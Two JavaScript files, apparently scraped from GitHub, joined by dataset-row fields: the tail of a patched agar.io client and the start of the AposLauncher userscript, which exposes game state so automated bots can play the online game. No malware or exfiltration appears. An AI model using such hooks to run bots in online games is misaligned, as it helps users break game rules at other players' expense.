f.fillRect(0, 0, m, r);         f.save();         f.strokeStyle = ta ? ""#AAAAAA"" : ""#000000"";         f.globalAlpha = .2 * h;         for (var a = m / h, b = r / h, c = (a / 2 - s) % 50; c < a; c += 50) f.beginPath(), f.moveTo(c * h - .5, 0), f.lineTo(c * h - .5, b * h), f.stroke();         for (c = (b / 2 - t) % 50; c < b; c += 50) f.beginPath(), f.moveTo(0, c * h - .5), f.lineTo(a * h, c * h - .5), f.stroke();         f.restore()     }      function Cb() {         if (Qa && Ja.width) {             var a = m / 5;             f.drawImage(Ja, 5, 5, a, a)         }     }      function Bb() {         for (var a = 0, b = 0; b < k.length; b++) a += k[b].q * k[b].q;         return a     }      function ab() {         z = null;         if (null != A || 0 != F.length)             if (null != A || wa) {                 z = document.createElement(""canvas"");                 var a = z.getContext(""2d""),                     b = 60,                     b = null == A ? b + 24 * F.length : b + 180,                     c = Math.min(200, .3 * m) / 200;                 z.width = 200 * c;                 z.height = b * c;                 a.scale(c, c);                 a.globalAlpha = .4;                 a.fillStyle = ""#000000"";                 a.fillRect(0, 0, 200, b);                 a.globalAlpha =                     1;                 a.fillStyle = ""#FFFFFF"";                 c = null;                 c = Z(""leaderboard"");                 a.font = ""30px Ubuntu"";                 a.fillText(c, 100 - a.measureText(c).width / 2, 40);                 if (null == A)                     for (a.font = ""20px Ubuntu"", b = 0; b < F.length; ++b) c = F[b].name || Z(""unnamed_cell""), wa || (c = Z(""unnamed_cell"")), -1 != M.indexOf(F[b].id) ? (k[0].name && (c = k[0].name), a.fillStyle = ""#FFAAAA"") : a.fillStyle = ""#FFFFFF"", c = b + 1 + "". "" + c, a.fillText(c, 100 - a.measureText(c).width / 2, 70 + 24 * b);                 else                     for (b = c = 0; b < A.length; ++b) {                         var d = c + A[b] * Math.PI * 2;                         a.fillStyle = Db[b + 1];                         a.beginPath();                         a.moveTo(100, 140);                         a.arc(100,                             140, 80, c, d, !1);                         a.fill();                         c = d                     }             }     }      function Ka(a, b, c, d, e) {         this.V = a;         this.x = b;         this.y = c;         this.i = d;         this.b = e     }      function da(a, b, c, d, e, p) {         this.id = a;         this.s = this.x = b;         this.t = this.y = c;         this.r = this.size = d;         this.color = e;         this.a = [];         this.W();         this.B(p)     }      function va(a, b, c, d) {         a && (this.u = a);         b && (this.S = b);         this.U = !!c;         d && (this.v = d)     }      function S(a, b) {         var c = ""1"" == e(""#helloContainer"").attr(""data-has-account-data"");         e(""#helloContainer"").attr(""data-has-account-data"", ""1"");         if (null == b && d.localStorage.loginCache) {             var l = JSON.parse(d.localStorage.loginCache);             l.f = a.f;             l.d = a.d;             l.e = a.e;             d.localStorage.loginCache = JSON.stringify(l)         }         if (c) {             var u = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[0],                 c = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[1].split("" "")[0],                 l = e("".agario-profile-panel .progress-bar-star"").first().text();             if (l != a.e) S({                 f: c,                 d: c,                 e: l             }, function() {                 e("".agario-profile-panel .progress-bar-star"").text(a.e);                 e("".agario-exp-bar .progress-bar"").css(""width"", ""100%"");                 e("".progress-bar-star"").addClass(""animated tada"").one(""webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend"",                     function() {                         e("".progress-bar-star"").removeClass(""animated tada"")                     });                 setTimeout(function() {                     e("".agario-exp-bar .progress-bar-text"").text(a.d + ""/"" + a.d + "" XP"");                     S({                         f: 0,                         d: a.d,                         e: a.e                     }, function() {                         S(a, b)                     })                 }, 1E3)             });             else {                 var p = Date.now(),                     g = function() {                         var c;                         c = (Date.now() - p) / 1E3;                         c = 0 > c ? 0 : 1 < c ? 1 : c;                         c = c * c * (3 - 2 * c);                         e("".agario-exp-bar .progress-bar-text"").text(~~(u + (a.f - u) * c) + ""/"" + a.d + "" XP"");                         e("".agario-exp-bar .progress-bar"").css(""width"", (88 * (u + (a.f - u) * c) / a.d).toFixed(2) + ""%"");                         1 > c ? d.requestAnimationFrame(g) : b && b()                     };                 d.requestAnimationFrame(g)              }         } else e("".agario-profile-panel .progress-bar-star"").text(a.e),             e("".agario-exp-bar .progress-bar-text"").text(a.f + ""/"" + a.d + "" XP""), e("".agario-exp-bar .progress-bar"").css(""width"", (88 * a.f / a.d).toFixed(2) + ""%""), b && b()      }      function jb(a) {         ""string"" == typeof a && (a = JSON.parse(a));         Date.now() + 18E5 > a.ja ? e(""#helloContainer"").attr(""data-logged-in"", ""0"") : (d.localStorage.loginCache = JSON.stringify(a), B = a.fa, e("".agario-profile-name"").text(a.name), $a(), S({             f: a.f,             d: a.d,             e: a.e         }), e(""#helloContainer"").attr(""data-logged-in"", ""1""))     }      function Eb(a) {         a = a.split(""\\n"");         jb({             name: a[0],             ta: a[1],             fa: a[2],             ja: 1E3 *                 +a[3],             e: +a[4],             f: +a[5],             d: +a[6]         });         console.log(""Hello Facebook?"");     }      function La(a) {         if (""connected"" == a.status) {             var b = a.authResponse.accessToken;             d.FB.api(""/me/picture?width=180&height=180"", function(a) {                 d.localStorage.fbPictureCache = a.data.url;                 e("".agario-profile-picture"").attr(""src"", a.data.url)             });             e(""#helloContainer"").attr(""data-logged-in"", ""1"");             null != B ? e.ajax(""https://m.agar.io/checkToken"", {                 error: function() {                     console.log(""Facebook Fail!"");                     B = null;                     La(a)                 },                 success: function(a) {                     a = a.split(""\\n"");                     S({                         e: +a[0],                         f: +a[1],                         d: +a[2]                     });                     console.log(""Facebook connected!"");                 },                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: B             }) : e.ajax(""https://m.agar.io/facebookLogin"", {                 error: function() {                     console.log(""You have a Facebook problem!"");                     B = null;                     e(""#helloContainer"").attr(""data-logged-in"", ""0"")                 },                 success: Eb,                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: b             })         }     }      function Wa(a) {         Y("":party"");         e(""#helloContainer"").attr(""data-party-state"", ""4"");         a = decodeURIComponent(a).replace(/.*#/gim, """");         Ma(""#"" + d.encodeURIComponent(a));         e.ajax(Na + ""//m.agar.io/getToken"", {             error: function() {                 e(""#helloContainer"").attr(""data-party-state"", ""6"")             },             success: function(b) {                 b = b.split(""\\n"");                 e("".partyToken"").val(""agar.io/#"" +                     d.encodeURIComponent(a));                 e(""#helloContainer"").attr(""data-party-state"", ""5"");                 Y("":party"");                 Ca(""ws://"" + b[0], a)             },             dataType: ""text"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: a         })     }      function Ma(a) {         d.history && d.history.replaceState && d.history.replaceState({}, d.document.title, a)     }     if (!d.agarioNoInit) {         var Na = d.location.protocol,             tb = ""https:"" == Na,             xa = d.navigator.userAgent;         if (-1 != xa.indexOf(""Android"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""PlayStore""), setTimeout(function() {                 d.location.href = ""market://details?id=com.miniclip.agar.io""             },             1E3);         else if (-1 != xa.indexOf(""iPhone"") || -1 != xa.indexOf(""iPad"") || -1 != xa.indexOf(""iPod"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""AppStore""), setTimeout(function() {             d.location.href = ""https://itunes.apple.com/app/agar.io/id995999703""         }, 1E3);         else {             var za, f, G, m, r, X = null,                  //UPDATE                 toggle = false,                 toggleDraw = false,                 tempPoint = [0, 0, 1],                 dPoints = [],                 circles = [],                 dArc = [],                 dText = [],                 lines = [],                 names = [""Vilhena""],                 originalName = names[Math.floor(Math.random() * names.length)],                 sessionScore = 0,                 serverIP = """",                 interNodes = [],                 lifeTimer = new Date(),                 bestTime = 0,                 botIndex = 0,                 reviving = false,                 message = [],                  q = null,                 s = 0,                 t = 0,                 M = [],                 k = [],                 E = {},                 v = [],                 Q = [],                 F = [],                 fa = 0,                 ga = 0,                  //UPDATE                 ia = -1,                 ja = -1,                  zb = 0,                 C = 0,                 ib = 0,                 K = null,                 pa = 0,                 qa = 0,                 ra = 1E4,                 sa = 1E4,                 h = 1,                 y = null,                 kb = !0,                 wa = !0,                 Oa = !1,                 Ha = !1,                 R = 0,                 ta = !1,                 lb = !1,                 aa = s = ~~((pa + ra) / 2),                 ba = t = ~~((qa + sa) / 2),                 ca = 1,                 P = """",                 A = null,                 ya = !1,                 Ga = !1,                 Ea = 0,                 Fa =                 0,                 na = 0,                 oa = 0,                 mb = 0,                 Db = [""#333333"", ""#FF3333"", ""#33FF33"", ""#3333FF""],                 Ia = !1,                 $ = !1,                 bb = 0,                 B = null,                 J = 1,                 x = 1,                 W = !0,                 Ba = 0,                 Da = {};             (function() {                 var a = d.location.search;                 ""?"" == a.charAt(0) && (a = a.slice(1));                 for (var a = a.split(""&""), b = 0; b < a.length; b++) {                     var c = a[b].split(""="");                     Da[c[0]] = c[1]                 }             })();             var Qa = ""ontouchstart"" in d && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(d.navigator.userAgent),                 Ja = new Image;             Ja.src = ""img/split.png"";             var nb = document.createElement(""canvas"");             if (""undefined"" == typeof console || ""undefined"" ==                 typeof DataView || ""undefined"" == typeof WebSocket || null == nb || null == nb.getContext || null == d.localStorage) alert(""You browser does not support this game, we recommend you to use Firefox to play this"");             else {                 var ka = null;                 d.setNick = function(a) {                     //UPDATE                     originalName = a;                     if (getPlayer().length == 0) {                         lifeTimer = new Date();                     }                      Xa();                     K = a;                     cb();                     R = 0                 };                 d.setRegion = ha;                 d.setSkins = function(a) {                     kb = a                 };                 d.setNames = function(a) {                     wa = a                 };                 d.setDarkTheme = function(a) {                     ta = a                 };                 d.setColors = function(a) {                     Oa = a                 };                 d.setShowMass = function(a) {                     lb = a                 };                 d.spectate = function() {                     K = null;                     H(1);                     Xa()                 };                 d.setGameMode = function(a) {                     a != P && ("":party"" ==                         P && e(""#helloContainer"").attr(""data-party-state"", ""0""), Y(a), "":party"" != a && I())                 };                 d.setAcid = function(a) {                     Ia = a                 };                 null != d.localStorage && (null == d.localStorage.AB9 && (d.localStorage.AB9 = 0 + ~~(100 * Math.random())), mb = +d.localStorage.AB9, d.ABGroup = mb);                 e.get(Na + ""//gc.agar.io"", function(a) {                     var b = a.split("" "");                     a = b[0];                     b = b[1] || """"; - 1 == [""UA""].indexOf(a) && ob.push(""ussr"");                     ea.hasOwnProperty(a) && (""string"" == typeof ea[a] ? y || ha(ea[a]) : ea[a].hasOwnProperty(b) && (y || ha(ea[a][b])))                 }, ""text"");                 d.ga && d.ga(""send"", ""event"", ""User-Agent"", d.navigator.userAgent, {                     nonInteraction: 1                 });                 var la = !1,                     Ya = 0;                 setTimeout(function() {                     la = !0                 }, Math.max(6E4 * Ya, 1E4));                 var ea = {                         AF: ""JP-Tokyo"",                         AX: ""EU-London"",                         AL: ""EU-London"",                         DZ: ""EU-London"",                         AS: ""SG-Singapore"",                         AD: ""EU-London"",                         AO: ""EU-London"",                         AI: ""US-Atlanta"",                         AG: ""US-Atlanta"",                         AR: ""BR-Brazil"",                         AM: ""JP-Tokyo"",                         AW: ""US-Atlanta"",                         AU: ""SG-Singapore"",                         AT: ""EU-London"",                         AZ: ""JP-Tokyo"",                         BS: ""US-Atlanta"",                         BH: ""JP-Tokyo"",                         BD: ""JP-Tokyo"",                         BB: ""US-Atlanta"",                         BY: ""EU-London"",                         BE: ""EU-London"",                         BZ: ""US-Atlanta"",                         BJ: ""EU-London"",                         BM: ""US-Atlanta"",                         BT: ""JP-Tokyo"",                         BO: ""BR-Brazil"",                         BQ: ""US-Atlanta"",                         BA: ""EU-London"",                         BW: ""EU-London"",                         BR: ""BR-Brazil"",                         IO: ""JP-Tokyo"",                         VG: ""US-Atlanta"",                         BN: ""JP-Tokyo"",                         BG: ""EU-London"",                         BF: ""EU-London"",                         BI: ""EU-London"",                         KH: ""JP-Tokyo"",                         CM: ""EU-London"",                         CA: ""US-Atlanta"",                         CV: ""EU-London"",                         KY: ""US-Atlanta"",                         CF: ""EU-London"",                         TD: ""EU-London"",                         CL: ""BR-Brazil"",                         CN: ""CN-China"",                         CX: ""JP-Tokyo"",                         CC: ""JP-Tokyo"",                         CO: ""BR-Brazil"",                         KM: ""EU-London"",                         CD: ""EU-London"",                         CG: ""EU-London"",                         CK: ""SG-Singapore"",                         CR: ""US-Atlanta"",                         CI: ""EU-London"",                         HR: ""EU-London"",                         CU: ""US-Atlanta"",                         CW: ""US-Atlanta"",                         CY: ""JP-Tokyo"",                         CZ: ""EU-London"",                         DK: ""EU-London"",                         DJ: ""EU-London"",                         DM: ""US-Atlanta"",                         DO: ""US-Atlanta"",                         EC: ""BR-Brazil"",                         EG: ""EU-London"",                         SV: ""US-Atlanta"",                         GQ: ""EU-London"",                         ER: ""EU-London"",                         EE: ""EU-London"",                         ET: ""EU-London"",                         FO: ""EU-London"",                         FK: ""BR-Brazil"",                         FJ: ""SG-Singapore"",                         FI: ""EU-London"",                         FR: ""EU-London"",                         GF: ""BR-Brazil"",                         PF: ""SG-Singapore"",                         GA: ""EU-London"",                         GM: ""EU-London"",                         GE: ""JP-Tokyo"",                         DE: ""EU-London"",                         GH: ""EU-London"",                         GI: ""EU-London"",                         GR: ""EU-London"",                         GL: ""US-Atlanta"",                         GD: ""US-Atlanta"",                         GP: ""US-Atlanta"",                         GU: ""SG-Singapore"",                         GT: ""US-Atlanta"",                         GG: ""EU-London"",                         GN: ""EU-London"",                         GW: ""EU-London"",                         GY: ""BR-Brazil"",                         HT: ""US-Atlanta"",                         VA: ""EU-London"",                         HN: ""US-Atlanta"",                         HK: ""JP-Tokyo"",                         HU: ""EU-London"",                         IS: ""EU-London"",                         IN: ""JP-Tokyo"",                         ID: ""JP-Tokyo"",                         IR: ""JP-Tokyo"",                         IQ: ""JP-Tokyo"",                         IE: ""EU-London"",                         IM: ""EU-London"",                         IL: ""JP-Tokyo"",                         IT: ""EU-London"",                         JM: ""US-Atlanta"",                         JP: ""JP-Tokyo"",                         JE: ""EU-London"",                         JO: ""JP-Tokyo"",                         KZ: ""JP-Tokyo"",                         KE: ""EU-London"",                         KI: ""SG-Singapore"",                         KP: ""JP-Tokyo"",                         KR: ""JP-Tokyo"",                         KW: ""JP-Tokyo"",                         KG: ""JP-Tokyo"",                         LA: ""JP-Tokyo"",                         LV: ""EU-London"",                         LB: ""JP-Tokyo"",                         LS: ""EU-London"",                         LR: ""EU-London"",                         LY: ""EU-London"",                         LI: ""EU-London"",                         LT: ""EU-London"",                         LU: ""EU-London"",                         MO: ""JP-Tokyo"",                         MK: ""EU-London"",                         MG: ""EU-London"",                         MW: ""EU-London"",                         MY: ""JP-Tokyo"",                         MV: ""JP-Tokyo"",                         ML: ""EU-London"",                         MT: ""EU-London"",                         MH: ""SG-Singapore"",                         MQ: ""US-Atlanta"",                         MR: ""EU-London"",                         MU: ""EU-London"",                         YT: ""EU-London"",                         MX: ""US-Atlanta"",                         FM: ""SG-Singapore"",                         MD: ""EU-London"",                         MC: ""EU-London"",                         MN: ""JP-Tokyo"",                         ME: ""EU-London"",                         MS: ""US-Atlanta"",                         MA: ""EU-London"",                         MZ: ""EU-London"",                         MM: ""JP-Tokyo"",                         NA: ""EU-London"",                         NR: ""SG-Singapore"",                         NP: ""JP-Tokyo"",                         NL: ""EU-London"",                         NC: ""SG-Singapore"",                         NZ: ""SG-Singapore"",                         NI: ""US-Atlanta"",                         NE: ""EU-London"",                         NG: ""EU-London"",                         NU: ""SG-Singapore"",                         NF: ""SG-Singapore"",                         MP: ""SG-Singapore"",                         NO: ""EU-London"",                         OM: ""JP-Tokyo"",                         PK: ""JP-Tokyo"",                         PW: ""SG-Singapore"",                         PS: ""JP-Tokyo"",                         PA: ""US-Atlanta"",                         PG: ""SG-Singapore"",                         PY: ""BR-Brazil"",                         PE: ""BR-Brazil"",                         PH: ""JP-Tokyo"",                         PN: ""SG-Singapore"",                         PL: ""EU-London"",                         PT: ""EU-London"",                         PR: ""US-Atlanta"",                         QA: ""JP-Tokyo"",                         RE: ""EU-London"",                         RO: ""EU-London"",                         RU: ""RU-Russia"",                         RW: ""EU-London"",                         BL: ""US-Atlanta"",                         SH: ""EU-London"",                         KN: ""US-Atlanta"",                         LC: ""US-Atlanta"",                         MF: ""US-Atlanta"",                         PM: ""US-Atlanta"",                         VC: ""US-Atlanta"",                         WS: ""SG-Singapore"",                         SM: ""EU-London"",                         ST: ""EU-London"",                         SA: ""EU-London"",                         SN: ""EU-London"",                         RS: ""EU-London"",                         SC: ""EU-London"",                         SL: ""EU-London"",                         SG: ""JP-Tokyo"",                         SX: ""US-Atlanta"",                         SK: ""EU-London"",                         SI: ""EU-London"",                         SB: ""SG-Singapore"",                         SO: ""EU-London"",                         ZA: ""EU-London"",                         SS: ""EU-London"",                         ES: ""EU-London"",                         LK: ""JP-Tokyo"",                         SD: ""EU-London"",                         SR: ""BR-Brazil"",                         SJ: ""EU-London"",                         SZ: ""EU-London"",                         SE: ""EU-London"",                         CH: ""EU-London"",                         SY: ""EU-London"",                         TW: ""JP-Tokyo"",                         TJ: ""JP-Tokyo"",                         TZ: ""EU-London"",                         TH: ""JP-Tokyo"",                         TL: ""JP-Tokyo"",                         TG: ""EU-London"",                         TK: ""SG-Singapore"",                         TO: ""SG-Singapore"",                         TT: ""US-Atlanta"",                         TN: ""EU-London"",                         TR: ""TK-Turkey"",                         TM: ""JP-Tokyo"",                         TC: ""US-Atlanta"",                         TV: ""SG-Singapore"",                         UG: ""EU-London"",                         UA: ""EU-London"",                         AE: ""EU-London"",                         GB: ""EU-London"",                         US: ""US-Atlanta"",                         UM: ""SG-Singapore"",                         VI: ""US-Atlanta"",                         UY: ""BR-Brazil"",                         UZ: ""JP-Tokyo"",                         VU: ""SG-Singapore"",                         VE: ""BR-Brazil"",                         VN: ""JP-Tokyo"",                         WF: ""SG-Singapore"",                         EH: ""EU-London"",                         YE: ""JP-Tokyo"",                         ZM: ""EU-London"",                         ZW: ""EU-London""                     },                     L = null;                 d.connect = Ca;                  //UPDATE                 /**                  * Tells you if the game is in Dark mode.                  * @return Boolean for dark mode.                  */                 window.getDarkBool = function() {                     return ta;                 }                  /**                  * Tells you if the mass is shown.                  * @return Boolean for player\'s mass.                  */                 window.getMassBool = function() {                     return lb;                 }                  /**                  * This is a copy of everything that is shown on screen.                  * Normally stuff will time out when off the screen, this                  * memorizes everything that leaves the screen for a little                  * while longer.                  * @return The memory object.                  */                 window.getMemoryCells = function() {                     return interNodes;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCellsArray = function() {                     return v;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCells = function() {                     return E;                 }                  /**                  * Returns an array with all the player\'s cells.                  * @return Player\'s cells                  */                 window.getPlayer = function() {                     return k;                 }                  /**                  * The canvas\' width.                  * @return Integer Width                  */                 window.getWidth = function() {                     return m;                 }                  /**                  * The canvas\' height                  * @return Integer Height                  */                 window.getHeight = function() {                     return r;                 }                  /**                  * Scaling ratio of the canvas. The bigger this ration,                  * the further that you see.                  * @return Screen scaling ratio.                  */                 window.getRatio = function() {                     return h;                 }                  /**                  * [getOffsetX description]                  * @return {[type]} [description]                  */                 window.getOffsetX = function() {                     return aa;                 }                  window.getOffsetY = function() {                     return ba;                 }                  window.getX = function() {                     return s;                 }                  window.getY = function() {                     return t;                 }                  window.getPointX = function() {                     return ia;                 }                  window.getPointY = function() {                     return ja;                 }                  /**                  * The X location of the mouse.                  * @return Integer X                  */                 window.getMouseX = function() {                     return fa;                 }                  /**                  * The Y location of the mouse.                  * @return Integer Y                  */                 window.getMouseY = function() {                     return ga;                 }                  window.getMapStartX = function() {                     return pa;                 }                  window.getMapStartY = function() {                     return qa;                 }                  window.getMapEndX = function() {                     return ra;                 }                  window.getMapEndY = function() {                     return sa;                 }                  window.getScreenDistance = function() {                     var temp = screenDistance();                     return temp;                 }                  /**                  * A timestamp since the last time the server sent any data.                  * @return Last update timestamp                  */                 window.getLastUpdate = function() {                     return C;                 }                  window.getCurrentScore = function() {                     return R;                 }                  /**                  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")                  * @return {[type]} [description]                  */                 window.getMode = function() {                     return P;                 }                  window.setPoint = function(x, y) {                     ia = x;                     ja = y;                 }                  window.setScore = function(a) {                     sessionScore = a * 100;                 }                  window.setBestTime = function(a) {                     bestTime = a;                 }                  window.best = function(a, b) {                     setScore(a);                     setBestTime(b);                 }                  window.setBotIndex = function(a) {                     console.log(""Changing bot"");                     botIndex = a;                 }                  window.setMessage = function(a) {                     message = a;                 }                 window.updateBotList = function() {                     window.bot",,3
0,https://github.com/Lifestylerr/DAWD.git,"/*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/ // ==UserScript== // @name        AposLauncher // @namespace   AposLauncher // @include     http://agar.io/* // @version     4.124 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript== var aposLauncherVersion = 4.124;  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b"";  function getLatestCommit() {     window.jQuery.ajax({         url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",         cache: false,         dataType: ""jsonp""     }).done(function(data) {         console.dir(data.data);         console.log(""hmm: "" + data.data.object.sha);         sha = data.data.object.sha;          function update(prefix, name, url) {             window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");             window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");             window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                 window.jQuery(""#"" + prefix + ""Dialog"").hide();                 window.jQuery(""#"" + prefix + ""Dialog"").remove();             });             window.jQuery(""#"" + prefix + ""Dialog"").show();         }          window.jQuery.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/launcher.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {             var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm, """");             latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"") + 11, latestVersion.indexOf(""// @grant""));              latestVersion = parseFloat(latestVersion + 0.0000);             var myVersion = parseFloat(aposLauncherVersion + 0.0000);              if (latestVersion > myVersion) {                 update(""aposLauncher"", ""launcher.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/launcher.user.js/"");             }             console.log(\'Current launcher.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);         });      }).fail(function() {}); } getLatestCommit();  console.log(""Running Bot Launcher!""); (function(d, e) {      //UPDATE     function keyAction(e) {         if (84 == e.keyCode) {             console.log(""Toggle"");             toggle = !toggle;         }         if (82 == e.keyCode) {             console.log(""ToggleDraw"");             toggleDraw = !toggleDraw;         }         if (68 == e.keyCode) {             window.setDarkTheme(!getDarkBool());         }         if (70 == e.keyCode) {             window.setShowMass(!getMassBool());         }         if (69 == e.keyCode) {             if (message.length > 0) {                 window.setMessage([]);                 window.onmouseup = function() {};                 window.ignoreStream = true;             } else {                 window.ignoreStream = false;                 window.refreshTwitch();             }         }         window.botList[botIndex].keyAction(e);     }      function humanPlayer() {         //Don\'t need to do anything.         return [getPointX(), getPointY()];     }        function pb() {          //UPDATE          window.botList = window.botList || [];          window.jQuery(\'#nick\').val(originalName);          function HumanPlayerObject() {             this.name = ""Human"";             this.keyAction = function(key) {};             this.displayText = function() {                 return [];             };             this.mainLoop = humanPlayer;         }          var hpo = new HumanPlayerObject();          window.botList.push(hpo);          window.updateBotList();          ya = !0;         Pa();         setInterval(Pa, 18E4);          var father = window.jQuery(""#canvas"").parent();         window.jQuery(""#canvas"").remove();         father.prepend(""<canvas id=\'canvas\'>"");          G = za = document.getElementById(""canvas"");         f = G.getContext(""2d"");         G.onmousedown = function(a) {             if (Qa) {                 var b = a.clientX - (5 + m / 5 / 2),                     c = a.clientY - (5 + m / 5 / 2);                 if (Math.sqrt(b * b + c * c) <= m / 5 / 2) {                     V();                     H(17);                     return                 }             }             fa = a.clientX;             ga = a.clientY;             Aa();             V();         };         G.onmousemove = function(a) {             fa = a.clientX;             ga = a.clientY;             Aa();         };         G.onmouseup = function() {};         /firefox/i.test(navigator.userAgent) ? document.addEventListener(""DOMMouseScroll"", Ra, !1) : document.body.onmousewheel = Ra;         var a = !1,             b = !1,             c = !1;         d.onkeydown = function(l) {             //UPDATE             if (!window.jQuery(\'#nick\').is("":focus"")) {                 32 != l.keyCode || a || (V(), H(17), a = !0);                 81 != l.keyCode || b || (H(18), b = !0);                 87 != l.keyCode || c || (V(), H(21), c = !0);                 27 == l.keyCode && Sa(!0);                  //UPDATE                 keyAction(l);             }         };         d.onkeyup = function(l) {             32 == l.keyCode && (a = !1);             87 == l.keyCode && (c = !1);             81 == l.keyCode && b && (H(19), b = !1);         };         d.onblur = function() {             H(19);             c = b = a = !1         };         d.onresize = Ta;         d.requestAnimationFrame(Ua);         setInterval(V, 40);         y && e(""#region"").val(y);         Va();         ha(e(""#region"").val());         0 == Ba && y && I();         W = !0;         e(""#overlays"").show();         Ta();         d.location.hash && 6 <= d.location.hash.length && Wa(d.location.hash)     }      function Ra(a) {         J *= Math.pow(.9, a.wheelDelta / -120 || a.detail || 0);         //UPDATE         0.07 > J && (J = 0.07);         J > 4 / h && (J = 4 / h)     }      function qb() {         if (.4 > h) X = null;         else {             for (var a = Number.POSITIVE_INFINITY, b = Number.POSITIVE_INFINITY, c = Number.NEGATIVE_INFINITY, l = Number.NEGATIVE_INFINITY, d = 0, p = 0; p < v.length; p++) {                 var g = v[p];                 !g.N() || g.R || 20 >= g.size * h || (d = Math.max(g.size, d), a = Math.min(g.x, a), b = Math.min(g.y, b), c = Math.max(g.x, c), l = Math.max(g.y, l))             }             X = rb.ka({                 ca: a - 10,                 da: b - 10,                 oa: c + 10,                 pa: l + 10,                 ma: 2,                 na: 4             });             for (p = 0; p < v.length; p++)                 if (g = v[p],                     g.N() && !(20 >= g.size * h))                     for (a = 0; a < g.a.length; ++a) b = g.a[a].x, c = g.a[a].y, b < s - m / 2 / h || c < t - r / 2 / h || b > s + m / 2 / h || c > t + r / 2 / h || X.m(g.a[a])         }     }      function Aa() {         //UPDATE         if (toggle || window.botList[botIndex].name == ""Human"") {             setPoint(((fa - m / 2) / h + s), ((ga - r / 2) / h + t));         }     }      function Pa() {         null == ka && (ka = {}, e(""#region"").children().each(function() {             var a = e(this),                 b = a.val();             b && (ka[b] = a.text())         }));         e.get(""https://m.agar.io/info"", function(a) {                 var b = {},                     c;                 for (c in a.regions) {                     var l = c.split("":"")[0];                     b[l] = b[l] || 0;                     b[l] += a.regions[c].numPlayers                 }                 for (c in b) e(\'#region option[value=""\' + c + \'""]\').text(ka[c] + "" ("" + b[c] + "" players)"")             },             ""json"")     }      function Xa() {         e(""#adsBottom"").hide();         e(""#overlays"").hide();         W = !1;         Va();         d.googletag && d.googletag.pubads && d.googletag.pubads().clear(d.aa)     }      function ha(a) {         a && a != y && (e(""#region"").val() != a && e(""#region"").val(a), y = d.localStorage.location = a, e("".region-message"").hide(), e("".region-message."" + a).show(), e("".btn-needs-server"").prop(""disabled"", !1), ya && I())     }      function Sa(a) {         W || (K = null, sb(), a && (x = 1), W = !0, e(""#overlays"").fadeIn(a ? 200 : 3E3))     }      function Y(a) {         e(""#helloContainer"").attr(""data-gamemode"", a);         P = a;         e(""#gamemode"").val(a)     }      function Va() {         e(""#region"").val() ? d.localStorage.location = e(""#region"").val() : d.localStorage.location && e(""#region"").val(d.localStorage.location);         e(""#region"").val() ? e(""#locationKnown"").append(e(""#region"")) : e(""#locationUnknown"").append(e(""#region""))     }      function sb() {         la && (la = !1, setTimeout(function() {             la = !0                 //UPDATE         }, 6E4 * Ya))     }      function Z(a) {         return d.i18n[a] || d.i18n_dict.en[a] || a     }      function Za() {         var a = ++Ba;         console.log(""Find "" + y + P);         e.ajax(""https://m.agar.io/findServer"", {             error: function() {                 setTimeout(Za, 1E3)             },             success: function(b) {                 a == Ba && (b.alert && alert(b.alert), Ca(""ws://"" + b.ip, b.token))             },             dataType: ""json"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: (y + P || ""?"") + ""\\n154669603""         })     }      function I() {         ya && y && (e(""#connecting"").show(), Za())     }      function Ca(a, b) {         if (q) {             q.onopen = null;             q.onmessage = null;             q.onclose 